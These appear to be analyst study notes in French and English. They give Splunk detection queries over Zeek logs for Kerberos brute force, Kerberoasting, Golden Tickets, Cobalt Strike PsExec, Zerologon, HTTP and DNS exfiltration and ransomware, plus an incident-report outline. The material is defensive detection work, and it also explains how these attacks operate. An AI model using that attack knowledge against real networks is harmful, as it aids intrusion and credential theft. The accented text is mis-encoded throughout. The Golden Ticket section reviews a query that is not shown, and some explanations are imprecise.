Une attaque **brute force Kerberos** consiste Ã  envoyer en masse des requÃªtes dâ€™authentification de type **AS-REQ** au **KDC** (Key Distribution Center), dans le but dâ€™identifier des noms dâ€™utilisateur valides. MÃªme si lâ€™authentification Ã©choue, les messages dâ€™erreur renvoyÃ©s permettent Ã  un attaquant de **deviner quels comptes existent rÃ©ellement**.

Ces tentatives sont gÃ©nÃ©ralement marquÃ©es par de nombreux Ã©checs dâ€™authentification, et certaines erreurs spÃ©cifiques permettent de distinguer les noms dâ€™utilisateurs valides des invalides.

---

### âœ… **RequÃªte Splunk â€“ DÃ©tection de brute force Kerberos**

```spl
index="kerberos_bruteforce" sourcetype="bro:kerberos:json"
error_msg!=KDC_ERR_PREAUTH_REQUIRED
success="false" request_type=AS
| bin _time span=5m
| stats count dc(client) as "Utilisateurs uniques" values(error_msg) as "Messages d'erreur" by _time, id.orig_h, id.resp_h
| where count>30
```

---

### ğŸ§  **Explication de la requÃªte**

1. **Source des donnÃ©es**

   * `index="kerberos_bruteforce"` : Index contenant les logs Kerberos capturÃ©s par Zeek.
   * `sourcetype="bro:kerberos:json"` : Source au format JSON spÃ©cifique aux Ã©vÃ©nements Kerberos.

2. **Filtrage des erreurs pertinentes**

   * `error_msg!=KDC_ERR_PREAUTH_REQUIRED` : Exclut les erreurs classiques de prÃ©-authentification (ce type d'erreur indique souvent que lâ€™utilisateur **existe**, ce qui est justement ce que cherchent les attaquants).
   * Cela permet de se concentrer sur les tentatives qui **Ã©chouent sans atteindre le stade de la prÃ©-authentification**, typiques lors de tests sur des comptes inexistants.

3. **SÃ©lection des Ã©checs dâ€™authentification AS-REQ**

   * `success="false"` : Ne garde que les tentatives dâ€™authentification Ã©chouÃ©es.
   * `request_type=AS` : Se focalise sur les requÃªtes de type AS-REQ, envoyÃ©es pour obtenir un TGT.

4. **Regroupement temporel des Ã©vÃ©nements**

   * `| bin _time span=5m` : Regroupe les Ã©vÃ©nements par tranche de 5 minutes, ce qui permet de dÃ©tecter les rafales de requÃªtes typiques des attaques brute force.

5. **Statistiques par client et serveur**

   * `| stats count dc(client) as "Utilisateurs uniques" values(error_msg) as "Messages d'erreur" by _time, id.orig_h, id.resp_h` :

     * `count` : Nombre total de tentatives Ã©chouÃ©es par tranche de temps et par adresse IP.
     * `dc(client)` : Nombre de noms dâ€™utilisateur distincts ciblÃ©s.
     * `values(error_msg)` : Liste des messages dâ€™erreur retournÃ©s, utiles pour repÃ©rer une phase de reconnaissance ou de test d'existence de comptes.

6. **Seuil dâ€™alerte pour dÃ©tection**

   * `| where count>30` : Ne conserve que les cas oÃ¹ **plus de 30 tentatives Ã©chouÃ©es** sont observÃ©es en 5 minutes, ce qui est considÃ©rÃ© comme suspect.

---

### ğŸ•µï¸ **InterprÃ©tation des rÃ©sultats**

* **Volume Ã©levÃ© de tentatives Ã©chouÃ©es** : Une origine unique (mÃªme IP) avec plus de 30 tentatives Ã©chouÃ©es dans un intervalle court indique fortement une **attaque brute force**.
* **DiversitÃ© des comptes ciblÃ©s** : Un grand nombre dâ€™utilisateurs diffÃ©rents suggÃ¨re une tentative de **dÃ©couverte de comptes valides**.
* **Analyse des messages dâ€™erreur** : Certains codes dâ€™erreur peuvent confirmer que des utilisateurs existent, ce qui signifie que lâ€™attaquant tente d'**Ã©numÃ©rer les comptes** avant de passer Ã  lâ€™attaque.

---

### ğŸ“Œ **Ã€ investiguer**

* **Adresse IP source (`id.orig_h`)** : Est-ce une machine interne ? Est-elle censÃ©e gÃ©nÃ©rer des requÃªtes Kerberos ?
* **Cible (`id.resp_h`)** : GÃ©nÃ©ralement un KDC, mais peut varier. Est-ce cohÃ©rent avec le trafic habituel ?
* **RÃ©action en cas dâ€™alerte** : Surveiller le poste, bloquer temporairement lâ€™IP, renforcer la journalisation et activer des protections comme la limitation des tentatives.

---

```

## **Detecting Kerberoasting**

```jsx

---

## ğŸ” **F. DÃ©tection de Kerberoasting via Splunk**

Le **Kerberoasting** est une technique dâ€™attaque oÃ¹ un attaquant possÃ©dant des identifiants valides dans le domaine demande des tickets TGS (Ticket Granting Service) pour des comptes de service (SPN). Ces tickets, souvent chiffrÃ©s avec lâ€™algorithme RC4, peuvent ensuite Ãªtre **craquÃ©s hors ligne** afin dâ€™extraire les mots de passe en clair des comptes ciblÃ©s.

Lâ€™indicateur principal est la **demande anormale de tickets TGS utilisant RC4**, car cette mÃ©thode de chiffrement est privilÃ©giÃ©e pour le craquage.

---

### âœ… **RequÃªte Splunk â€“ DÃ©tection de Kerberoasting**

```spl
index="sharphound" sourcetype="bro:kerberos:json"
request_type=TGS cipher="rc4-hmac" 
forwardable="true" renewable="true"
| table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service
```

---

### ğŸ§  **Explication de la requÃªte**

1. **Source des donnÃ©es**

   * `index="sharphound"` : Index contenant les Ã©vÃ©nements de Kerberos, collectÃ©s par un outil comme SharpHound ou un systÃ¨me de monitoring rÃ©seau.
   * `sourcetype="bro:kerberos:json"` : Utilise les logs Zeek (anciennement Bro) pour les Ã©vÃ©nements Kerberos au format JSON.

2. **Filtrage des requÃªtes TGS chiffrÃ©es en RC4**

   * `request_type=TGS` : Ne retient que les requÃªtes de tickets de service.
   * `cipher="rc4-hmac"` : SÃ©lectionne les tickets utilisant le chiffrement RC4, plus vulnÃ©rable, et donc privilÃ©giÃ© par les attaquants.

3. **CritÃ¨res comportementaux suspects**

   * `forwardable="true"` : Le ticket peut Ãªtre rÃ©utilisÃ© sur dâ€™autres services.
   * `renewable="true"` : Le ticket peut Ãªtre prolongÃ©, ce qui est utile pour un attaquant cherchant une persistance.

4. **Affichage clair des rÃ©sultats**

   * `table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service` : Affiche les informations essentielles pour lâ€™analyse :

     * Date et heure de lâ€™Ã©vÃ©nement.
     * IP source (client) et IP destination (souvent un contrÃ´leur de domaine).
     * Type de requÃªte, chiffrement utilisÃ©.
     * Compte client et service cible.

---

### ğŸ•µï¸ **InterprÃ©tation**

* **Plusieurs requÃªtes TGS en RC4** : Une frÃ©quence Ã©levÃ©e de requÃªtes TGS avec RC4 par un mÃªme utilisateur ou hÃ´te est **hautement suspecte**.
* **Comptes Ã  privilÃ¨ges ou services sensibles** : Si le champ `service` cible un compte critique (SQL, Exchange, etc.), cela peut indiquer une tentative de Kerberoasting.
* **ActivitÃ© centralisÃ©e sur un poste utilisateur** : Des requÃªtes massives de TGS depuis un poste utilisateur (plutÃ´t quâ€™un service ou serveur) sont anormales.

---

### ğŸ“Œ **Ã€ investiguer**

* **Client (`id.orig_h`)** : Sâ€™agit-il dâ€™une machine lÃ©gitime ?
* **Compte (`client`)** : Est-ce un compte utilisateur normal ou un compte de service dÃ©tournÃ© ?
* **Service ciblÃ© (`service`)** : Est-ce un compte ayant des privilÃ¨ges Ã©levÃ©s ou un rÃ´le critique ?

---

```

## **Detecting Golden Tickets**

```jsx

---

### âœ… Strengths

* **Precision Targeting**: Focusing on `request_type=="TGS"` and `unique_request_types==1` accurately narrows in on possible forged activity.
* **Use of Zeek's `bro:kerberos:json`**: Shows you're leveraging network-layer Kerberos visibility, which is less prone to tampering than Windows logs alone.
* **Binning by Time**: Grouping by 1-minute intervals helps detect burst or pattern-based activity, which is key in attacker behavior.

---

### ğŸ” Suggested Enhancements

#### 1. **Improve `request_types=="TGS"` Handling**

`values(request_type)` can return a multivalue field (array-like), so direct equality may be unreliable. Use `mvcount()` and `mvindex()` to improve robustness:

```spl
| where unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

This ensures `request_types` truly only contains `"TGS"`.

---

#### 2. **Add Host Context**

If Zeek logs contain `host` or `principal` fields, include them for deeper triage:

```spl
| stats values(client), values(principal), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
```

---

#### 3. **Add Baseline for Alert Tuning**

To avoid false positives, consider correlating results with a list of known service accounts (e.g., via `lookup service_accounts.csv`) to suppress legitimate batch activity.

---

#### 4. **Optional: Include Count for Volume**

Adding request count per interval can reveal abnormal ticket request volume:

```spl
| stats count as total_requests, values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
```

Then filter with something like:

```spl
| where total_requests > 10 AND unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

---

### âœ… Final Enhanced Query Example

```spl
index="golden_ticket_attack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin _time span=1m
| stats count as total_requests, values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
| where total_requests > 10 AND unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

This version is more robust and better tuned for production alerts.

---

```

## **Detecting Cobalt Strike's PSExec**

```jsx

---

## RequÃªte Splunk pour la dÃ©tection de lâ€™outil PSExec de Cobalt Strike

La requÃªte suivante permet de repÃ©rer les comportements caractÃ©ristiques de lâ€™utilisation de lâ€™outil `psexec` de **Cobalt Strike**. Celui-ci sâ€™appuie sur le protocole **SMB** pour dÃ©poser et exÃ©cuter des fichiers (typiquement des exÃ©cutables) sur une machine cible, en accÃ©dant Ã  des partages administratifs comme `C$` ou `ADMIN$`.

### RequÃªte Splunk

```spl
index="cobalt_strike_psexec"
sourcetype="bro:smb_files:json"
action="SMB::FILE_OPEN" 
name IN ("*.exe", "*.dll", "*.bat")
path IN ("*\\c$", "*\\ADMIN$")
size > 0
```

---

### DÃ©tail de la requÃªte

1. **SÃ©lection de la source de donnÃ©es**

   * `index="cobalt_strike_psexec"` : Cible lâ€™index contenant les Ã©vÃ©nements liÃ©s aux activitÃ©s de `psexec`.
   * `sourcetype="bro:smb_files:json"` : Filtre les Ã©vÃ©nements SMB enregistrÃ©s par Zeek/Bro, au format JSON, relatifs aux opÃ©rations sur fichiers via SMB.

2. **Filtrage des actions dâ€™ouverture de fichier**

   * `action="SMB::FILE_OPEN"` : Ne conserve que les Ã©vÃ©nements oÃ¹ un fichier a Ã©tÃ© ouvert via SMB â€” une action typique lors du dÃ©ploiement dâ€™un binaire avec `psexec`.

3. **Types de fichiers suspects**

   * `name IN ("*.exe", "*.dll", "*.bat")` : Cible les fichiers exÃ©cutables, DLL et scripts batch â€” types couramment utilisÃ©s pour dÃ©poser des charges malveillantes.

4. **AccÃ¨s aux partages administratifs**

   * `path IN ("*\\c$", "*\\ADMIN$")` : Se concentre sur les chemins administratifs Windows, comme `C$` et `ADMIN$`, que `psexec` utilise souvent pour transfÃ©rer des fichiers.

5. **Fichiers non vides**

   * `size > 0` : Exclut les fichiers vides pour ne garder que ceux susceptibles de contenir une vÃ©ritable charge utile.

---

## StratÃ©gie de dÃ©tection et interprÃ©tation

Cette requÃªte permet dâ€™identifier une sÃ©quence dâ€™actions typique de lâ€™utilisation de `psexec` par Cobalt Strike :

* **DÃ©ploiement de payload Ã  distance** : Lâ€™ouverture dâ€™un fichier `.exe`, `.dll` ou `.bat` sur un partage comme `C$` ou `ADMIN$`, via SMB, suggÃ¨re un dÃ©ploiement automatisÃ© Ã  lâ€™aide dâ€™un outil dâ€™administration distante.

* **Filtrage efficace du trafic lÃ©gitime** : En ciblant les fichiers exÃ©cutables non vides sur des partages administratifs, on limite les faux positifs dus aux opÃ©rations lÃ©gitimes ou aux fichiers inoffensifs.

---

```

## **Detecting Zerologon**

```jsx
### **Splunk Query for Detecting Zerologon Attack**

```spl
index="zerologon" endpoint="netlogon" sourcetype="bro:dce_rpc:json"
| bin _time span=1m
| where operation == "NetrServerReqChallenge" OR operation == "NetrServerAuthenticate3" OR operation == "NetrServerPasswordSet2"
| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h
| where unique_operations >= 2 AND count>100
```

### **Query Breakdown**:

1. **Data Source**:

   * `index="zerologon"`: Filters for Zerologon-related events.
   * `endpoint="netlogon"`: Focuses on Netlogon traffic, exploited in Zerologon.
   * `sourcetype="bro:dce_rpc:json"`: Captures DCE-RPC logs from Zeek.

2. **Time Binning**:

   * `| bin _time span=1m`: Groups events in one-minute intervals to detect rapid patterns.

3. **Key Operations Filtering**:

   * Filters for Zerologon-related operations: `NetrServerReqChallenge`, `NetrServerAuthenticate3`, and `NetrServerPasswordSet2`.

4. **Statistical Analysis**:

   * `| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h`: Aggregates by time and IPs, counting occurrences and distinct operations.

5. **Anomalous Pattern Detection**:

   * `| where unique_operations >= 2 AND count>100`: Flags cases with multiple operations and high counts, indicating suspicious activity typical of a Zerologon attack.

```

## **Detecting Exfiltration (HTTP)**

```jsx
### RequÃªte Splunk pour dÃ©tecter une exfiltration de donnÃ©es via HTTP

```spl
index="cobaltstrike_exfiltration_http" sourcetype="bro:http:json" method=POST
| stats sum(request_body_len) as TotalBytes by src, dest, dest_port
| eval TotalBytes = TotalBytes/1024/1024
```

### Explication de la requÃªte

1. **SÃ©lection de la source de donnÃ©es** :

   * `index="cobaltstrike_exfiltration_http"` : cible les logs prÃ©sents dans lâ€™index dÃ©diÃ© Ã  la dÃ©tection dâ€™exfiltration HTTP potentielle liÃ©e Ã  Cobalt Strike.
   * `sourcetype="bro:http:json"` : sÃ©lectionne uniquement les logs HTTP gÃ©nÃ©rÃ©s par Zeek (anciennement Bro) au format JSON.
   * `method=POST` : filtre pour ne garder que les requÃªtes HTTP de type POST, car ce type de mÃ©thode est frÃ©quemment utilisÃ© pour exfiltrer des donnÃ©es dans le corps des requÃªtes.

2. **AgrÃ©gation du volume de donnÃ©es transfÃ©rÃ©es** :

   * `| stats sum(request_body_len) as TotalBytes by src, dest, dest_port` : calcule la somme de la taille des corps des requÃªtes POST (`request_body_len`) envoyÃ©s par chaque IP source (`src`) vers chaque IP de destination (`dest`) et port de destination (`dest_port`).

     * Cela permet de repÃ©rer des transferts anormalement volumineux de donnÃ©es vers certaines destinations, ce qui peut rÃ©vÃ©ler une exfiltration.

3. **Conversion de lâ€™unitÃ© de mesure** :

   * `| eval TotalBytes = TotalBytes/1024/1024` : convertit la taille totale des donnÃ©es transfÃ©rÃ©es depuis les octets vers les mÃ©gaoctets (Mo) pour une lecture plus intuitive.

```

## **Detecting Exfiltration (DNS)**

```jsx
### RequÃªte Splunk pour dÃ©tecter une exfiltration de donnÃ©es via DNS

```spl
index=dns_exf sourcetype="bro:dns:json"
| eval len_query=len(query)
| search len_query>=40 AND query!="*.ip6.arpa*" AND query!="*amazonaws.com*" AND query!="*._googlecast.*" AND query!="_ldap.*"
| bin _time span=24h
| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h
| where req_by_day>60
| table _time, id.orig_h, id.resp_h, req_by_day
```

### Explication de la requÃªte

1. **SÃ©lection des donnÃ©es pertinentes** :

   * `index=dns_exf sourcetype="bro:dns:json"` : filtre les logs pour ne garder que ceux relatifs au DNS (au format JSON de Bro/Zeek DNS) dans lâ€™index `dns_exf`, utilisÃ© ici pour surveiller une Ã©ventuelle exfiltration de donnÃ©es par DNS.

2. **Calcul de la longueur des requÃªtes DNS** :

   * `| eval len_query=len(query)` : calcule la longueur de chaque requÃªte DNS et stocke cette valeur dans un nouveau champ `len_query`. Les requÃªtes longues peuvent contenir des donnÃ©es encodÃ©es ou chiffrÃ©es.

3. **Filtrage sur la longueur des requÃªtes et exclusion de domaines lÃ©gitimes frÃ©quents** :

   * `| search len_query>=40 AND query!="*.ip6.arpa*" AND query!="*amazonaws.com*" AND query!="*._googlecast.*" AND query!="_ldap.*"` :

     * conserve uniquement les requÃªtes DNS dont la longueur est supÃ©rieure ou Ã©gale Ã  40 caractÃ¨res,
     * exclut les domaines connus et bÃ©nins, comme les requÃªtes de rÃ©solution IPv6 (`ip6.arpa`), les services cloud (`amazonaws.com`), les appareils Chromecast (`_googlecast`) et les requÃªtes LDAP.

4. **Regroupement des Ã©vÃ©nements par tranche de 24 heures** :

   * `| bin _time span=24h` : regroupe les Ã©vÃ©nements par jour pour faciliter lâ€™analyse temporelle.

5. **Comptage des requÃªtes par jour et par hÃ´te** :

   * `| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h` : compte le nombre total de requÃªtes DNS par jour (`req_by_day`), en les regroupant par adresse IP source (`id.orig_h`) et destination (`id.resp_h`).

6. **Identification dâ€™activitÃ©s suspectes** :

   * `| where req_by_day>60` : ne garde que les hÃ´tes ayant gÃ©nÃ©rÃ© plus de 60 requÃªtes DNS par jour â€” un comportement potentiellement indicatif dâ€™exfiltration.

7. **Affichage des rÃ©sultats** :

   * `| table _time, id.orig_h, id.resp_h, req_by_day` : affiche les rÃ©sultats dans un tableau avec la date, lâ€™IP source, lâ€™IP de destination et le nombre de requÃªtes par jour, pour une analyse simplifiÃ©e.

```

## **Detecting Ransomware**

```jsx

---

## **DÃ©tection des ransomwares avec Splunk**

### **1. DÃ©tection des opÃ©rations excessives d'ouverture et de renommage de fichiers**

Ce type de comportement est souvent observÃ© lors d'attaques par ransomware, oÃ¹ de nombreux fichiers sont ouverts et renommÃ©s dans de courtes pÃ©riodes.

#### **RequÃªte Splunk**

```spl
index="ransomware_open_rename_sodinokibi" sourcetype="bro:smb_files:json" 
| where action IN ("SMB::FILE_OPEN", "SMB::FILE_RENAME")
| bin _time span=5m
| stats count by _time, source, action
| where count>30 
| stats sum(count) as count values(action) dc(action) as uniq_actions by _time, source
| where uniq_actions==2 AND count>100
```

#### **Explication de la requÃªte**

* **Filtrage des Ã©vÃ©nements** : La recherche se limite aux actions `FILE_OPEN` et `FILE_RENAME` dans l'index spÃ©cifiÃ©.
* **Groupement par intervalles de 5 minutes** : Les Ã©vÃ©nements sont regroupÃ©s par pÃ©riodes de 5 minutes pour dÃ©tecter des pics d'activitÃ©.
* **Comptage des Ã©vÃ©nements** : Les actions sont comptÃ©es par `source` dans chaque pÃ©riode de 5 minutes, avec un seuil de 30 actions.
* **AgrÃ©gation des rÃ©sultats** : VÃ©rifie si les actions `FILE_OPEN` et `FILE_RENAME` sont prÃ©sentes dans les 100 premiÃ¨res occurrences, ce qui peut indiquer un comportement de ransomware.

---

### **2. DÃ©tection du renommage excessif de fichiers avec de nouvelles extensions**

Les ransomwares ont souvent pour habitude de renommer les fichiers en leur ajoutant des extensions uniques pour indiquer qu'ils ont Ã©tÃ© chiffrÃ©s.

#### **RequÃªte Splunk**

```spl
index="ransomware_new_file_extension_ctbl_ocker" sourcetype="bro:smb_files:json" action="SMB::FILE_RENAME" 
| bin _time span=5m
| rex field="name" "\.(?<new_file_name_extension>[^\.]*$)"
| rex field="prev_name" "\.(?<old_file_name_extension>[^\.]*$)"
| stats count by _time, id.orig_h, id.resp_p, name, source, old_file_name_extension, new_file_name_extension
| where new_file_name_extension!=old_file_name_extension
| stats count by _time, id.orig_h, id.resp_p, source, new_file_name_extension
| where count>20
| sort -count
```

#### **Explication de la requÃªte**

* **Filtrage par action et temps** : Limite les rÃ©sultats aux Ã©vÃ©nements de renommage de fichiers dans des fenÃªtres de 5 minutes.
* **Extraction des extensions** : Utilise des expressions rÃ©guliÃ¨res pour extraire les extensions des fichiers avant et aprÃ¨s le renommage.
* **Filtrage des changements d'extension** : Conserve uniquement les Ã©vÃ©nements oÃ¹ l'extension du fichier a changÃ©.
* **AgrÃ©gation des rÃ©sultats** : Compte les occurrences des nouveaux noms de fichiers par `source` et `new_file_name_extension`.
* **DÃ©tection de ransomware** : Identifie les cas oÃ¹ plus de 20 fichiers ont Ã©tÃ© renommÃ©s avec la mÃªme nouvelle extension dans un intervalle de 5 minutes.

---

### **Ressources supplÃ©mentaires pour la dÃ©tection des ransomwares**

Ces ressources peuvent fournir des informations utiles pour dÃ©tecter les ransomwares en se basant sur les extensions de fichiers et les motifs de noms connus :

* [Ransomware Extensions Spreadsheet](https://docs.google.com/spreadsheets/d/e/2PACX-1vRCVzG9JCzak3hNqqrVCTQQIzH0ty77BWiLEbDu-q9oxkhAamqnlYgtQ4gF85pF6j6g3GmQxivuvO1U/pubhtml)
* [Corelightâ€™s Detect-Ransomware-Filenames Repository](https://github.com/corelight/detect-ransomware-filenames)
* [Experiantâ€™s FSRM Ransomware Extensions](https://fsrm.experiant.ca/)

---

```

## **Security Incident Reporting**

## **Incident Reporting Process**

```jsx
### AperÃ§u

Le rapport d'incident de sÃ©curitÃ© est essentiel dans le paysage technologique actuel pour protÃ©ger les actifs organisationnels et rÃ©pondre efficacement aux menaces. Ce processus permet de documenter les incidents, d'apprendre des Ã©vÃ©nements passÃ©s et d'amÃ©liorer les capacitÃ©s de rÃ©ponse futures.

### Importance

Le rapport d'incident :

* **Relie la dÃ©tection Ã  l'attÃ©nuation**.
* **CrÃ©e un rÃ©fÃ©rentiel des leÃ§ons tirÃ©es**.
* **Informe l'Ã©valuation des risques, la conformitÃ© et la sensibilisation des parties prenantes**.

### Identification et CatÃ©gorisation des Incidents

#### Sources principales :

* **Outils de sÃ©curitÃ©** : IDS, IPS, EDR, XDR, SIEM, antivirus, donnÃ©es NetFlow.
* **Observation humaine** : Rapports d'employÃ©s concernant des activitÃ©s inhabituelles.
* **Notifications de tiers** : Alertes provenant de partenaires, fournisseurs ou clients.

#### Types d'incidents :

* **Malware** : Virus, ransomware.
* **Phishing** : Tentatives de vol de donnÃ©es sensibles.
* **DDoS** : Attaques par saturation pour perturber les services.
* **AccÃ¨s non autorisÃ©** : EntrÃ©e non autorisÃ©e dans les systÃ¨mes ou donnÃ©es.
* **Fuite de donnÃ©es** : Exposition accidentelle de donnÃ©es.
* **Breach physique** : AccÃ¨s physique non autorisÃ©.

#### Niveaux de sÃ©vÃ©ritÃ© :

* **Critique (P1)** : Risque immÃ©diat pour les fonctions principales, nÃ©cessite une action urgente.
* **Ã‰levÃ© (P2)** : Risque important, nÃ©cessite une attention rapide.
* **Moyenne (P3)** : Risque modÃ©rÃ©, une rÃ©ponse en temps utile est conseillÃ©e.
* **Faible (P4)** : ProblÃ¨mes mineurs, peuvent Ãªtre gÃ©rÃ©s dans les opÃ©rations quotidiennes.

### Processus de Rapport d'Incident

1. **DÃ©tection et reconnaissance** : Identification initiale, souvent par des alertes automatisÃ©es ou des observations humaines.
2. **Analyse prÃ©liminaire** : Ã‰valuer la portÃ©e et l'impact potentiel ; catÃ©goriser l'incident.
3. **Enregistrement de l'incident** : Documenter tous les dÃ©tails. Utiliser des outils comme JIRA, TheHive ou des alternatives plus simples.
4. **Notification** :

   * **Interne** : Informer les Ã©quipes IT, juridiques, PR et exÃ©cutives.
   * **Externe** : Si nÃ©cessaire, notifier les clients, partenaires, autoritÃ©s rÃ©glementaires ou le public.
5. **Investigation et rapport dÃ©taillÃ©** : RÃ©aliser une analyse approfondie de l'incident.
6. **CrÃ©ation du rapport final** : Fournir un rapport complet aux parties prenantes, dÃ©taillant l'incident, ses causes et les mesures correctives.
7. **Boucle de rÃ©troaction** : Analyse post-incident pour amÃ©liorer la prÃ©paration Ã  la rÃ©ponse.

```

## **Elements of a Proper Incident Report**

```jsx
### RÃ©sumÃ© ExÃ©cutif

Le rÃ©sumÃ© exÃ©cutif sert de point d'entrÃ©e accessible Ã  un large public, y compris aux parties prenantes non techniques. Cette section fournit une vue d'ensemble concise, les principaux rÃ©sultats, les actions immÃ©diates prises et l'impact sur les parties prenantes. De nombreuses parties prenantes ne liront que cette section, il est donc essentiel d'assurer une grande clartÃ©.

#### Section  |  Description

* **ID de l'incident** : Identifiant unique de l'incident.
* **Vue d'ensemble de l'incident** : RÃ©sumÃ© des Ã©vÃ©nements de l'incident (y compris la dÃ©tection initiale) et du type d'attaque (par exemple, ransomware, violation de donnÃ©es). Inclure l'heure estimÃ©e, la durÃ©e, les systÃ¨mes/donnÃ©es affectÃ©s et l'Ã©tat (en cours, rÃ©solu ou escaladÃ©).
* **Principaux rÃ©sultats** : RÃ©sumÃ© de la cause principale et des vulnÃ©rabilitÃ©s spÃ©cifiques exploitÃ©es. Mentionner les donnÃ©es compromises ou exfiltrÃ©es.
* **Actions immÃ©diates prises** : DÃ©tail des actions prises, comme l'isolement des systÃ¨mes, l'identification de la cause principale et l'engagement des services tiers.
* **Impact sur les parties prenantes** : Ã‰valuer l'impact sur les clients, les employÃ©s, les informations propriÃ©taires et les consÃ©quences financiÃ¨res potentielles.

### Analyse Technique

Analyse approfondie des Ã©vÃ©nements techniques pendant l'incident. Cette section devrait couvrir :

#### SystÃ¨mes et DonnÃ©es AffectÃ©s

* Lister tous les systÃ¨mes compromis ou potentiellement accessibles. Si des donnÃ©es ont Ã©tÃ© exfiltrÃ©es, spÃ©cifier la quantitÃ©.

#### Sources de Preuves et Analyse

* Inclure toutes les preuves analysÃ©es et la mÃ©thodologie (par exemple, les journaux d'accÃ¨s Web). Mettre l'accent sur l'intÃ©gritÃ© des preuves avec des hachages lorsque nÃ©cessaire.

#### Indicateurs de Compromission (IoC)

* Fournir les IoC (par exemple, processus inhabituels, trafic sortant) pour la recherche de menaces ou l'attribution Ã  des acteurs de menace spÃ©cifiques.

#### Analyse de la Cause Racine

* Explication dÃ©taillÃ©e des vulnÃ©rabilitÃ©s exploitÃ©es, des causes profondes et des points de dÃ©faillance.

#### Chronologie Technique

Documenter les Ã©vÃ©nements clÃ©s, y compris :

* **Reconnaissance**
* **Compromission initiale**
* **Communications C2**
* **Ã‰numÃ©ration, mouvement latÃ©ral**
* **AccÃ¨s et exfiltration de donnÃ©es**
* **DÃ©ploiement de malwares (Injection de processus, persistance)**
* **Temps de confinement, d'Ã©radication et de rÃ©cupÃ©ration**

#### Nature de l'attaque

* Explication du type d'attaque, des TTP (tactiques, techniques et procÃ©dures) utilisÃ©es par l'attaquant.

### Analyse de l'Impact

Ã‰valuer les effets nÃ©gatifs sur les donnÃ©es, les opÃ©rations et la rÃ©putation. Cela inclut la quantification et la qualification des dommages, les implications pour l'entreprise (par exemple, pertes financiÃ¨res), les pÃ©nalitÃ©s rÃ©glementaires et les impacts sur la rÃ©putation.

### Analyse de la RÃ©ponse et de la RÃ©cupÃ©ration

#### Actions ImmÃ©diates de RÃ©ponse

**RÃ©vocation d'accÃ¨s**

* **Comptes/SystÃ¨mes compromis identifiÃ©s** : DÃ©tail des outils et mÃ©thodes utilisÃ©s pour identifier les entitÃ©s compromises.
* **Cadre temporel** : Horodatage prÃ©cis de la dÃ©tection et de la rÃ©vocation.
* **MÃ©thode de rÃ©vocation** : Explication des mÃ©thodes de rÃ©vocation (par exemple, dÃ©sactivation des comptes, modification des rÃ¨gles du pare-feu).
* **Impact** : PrÃ©vention de toute autre compromission ou exfiltration.

**StratÃ©gie de Confinement**

* **Confinement Ã  court terme** : Isolement des systÃ¨mes affectÃ©s du rÃ©seau.
* **Confinement Ã  long terme** : Mesures stratÃ©giques comme la segmentation ou la mise en Å“uvre de la sÃ©curitÃ© zero-trust.
* **EfficacitÃ©** : Ã‰valuation des mesures de confinement.

#### Mesures d'Ã‰radication

**Suppression de Malware**

* **Identification** : ProcÃ©dures utilisÃ©es pour dÃ©tecter le malware, y compris les outils EDR ou l'analyse forensic.
* **Techniques de suppression** : Outils spÃ©cifiques ou mÃ©thodes manuelles utilisÃ©es.
* **VÃ©rification** : Ã‰tapes pour assurer la suppression complÃ¨te, comme la vÃ©rification des sommes de contrÃ´le.

**Patching du SystÃ¨me**

* **Identification des vulnÃ©rabilitÃ©s** : MÃ©thodes de dÃ©couverte des vulnÃ©rabilitÃ©s (par exemple, CVEs).
* **Gestion des patches** : Ã‰tapes pour tester, dÃ©ployer et vÃ©rifier les patches.
* **ProcÃ©dures de retour en arriÃ¨re** : ProcÃ©dures en cas d'instabilitÃ© aprÃ¨s dÃ©ploiement.

#### Ã‰tapes de RÃ©cupÃ©ration

**Restauration des donnÃ©es**

* **Validation des sauvegardes** : ProcÃ©dures pour confirmer l'intÃ©gritÃ© des sauvegardes.
* **Processus de restauration** : Ã‰tapes dÃ©taillÃ©es pour la rÃ©cupÃ©ration des donnÃ©es.
* **VÃ©rifications de l'intÃ©gritÃ© des donnÃ©es** : VÃ©rification de l'exactitude des donnÃ©es restaurÃ©es.

**Validation du systÃ¨me**

* **Mesures de sÃ©curitÃ©** : Assurer la sÃ©curitÃ© du systÃ¨me par la reconfiguration ou la mise Ã  jour des IDS.
* **ContrÃ´les opÃ©rationnels** : VÃ©rification que les systÃ¨mes fonctionnent comme prÃ©vu.

### Actions Post-Incident

#### Surveillance

* **Plans de surveillance amÃ©liorÃ©s** : Plans dÃ©taillÃ©s pour la surveillance future afin de dÃ©tecter des vulnÃ©rabilitÃ©s similaires.
* **Outils et technologies** : Outils spÃ©cifiques intÃ©grÃ©s dans la stratÃ©gie de surveillance.

#### LeÃ§ons TirÃ©es

* **Analyse des lacunes** : Ã‰valuation des mesures de sÃ©curitÃ© Ã©chouÃ©es.
* **Recommandations pour l'amÃ©lioration** : Ã‰tapes concrÃ¨tes pour renforcer les dÃ©fenses.
* **StratÃ©gie future** : Changements Ã  long terme dans la politique, l'architecture ou la formation.

### Diagrammes

Utiliser des visuels pour simplifier les complexitÃ©s de l'incident :

* **Diagramme de flux de l'incident** : Progression de l'attaque du point d'entrÃ©e Ã  la propagation du rÃ©seau.
* **Carte des systÃ¨mes affectÃ©s** : Topologie rÃ©seau mettant en Ã©vidence les nÅ“uds compromis.
* **Diagramme du vecteur d'attaque** : Diagramme du mouvement de l'attaquant et de son chemin d'exploitation.

### Annexes

Fournit un contexte supplÃ©mentaire, des preuves ou des dÃ©tails techniques. Cette section sert de base pour la vÃ©rification et ajoute de la profondeur au rÃ©cit principal du rapport.

Les contenus peuvent inclure :

* **Fichiers journaux**
* **Diagrammes du rÃ©seau (avant et aprÃ¨s l'incident)**
* **Preuves forensic (images disque, vidages de mÃ©moire)**
* **Extraits de code**
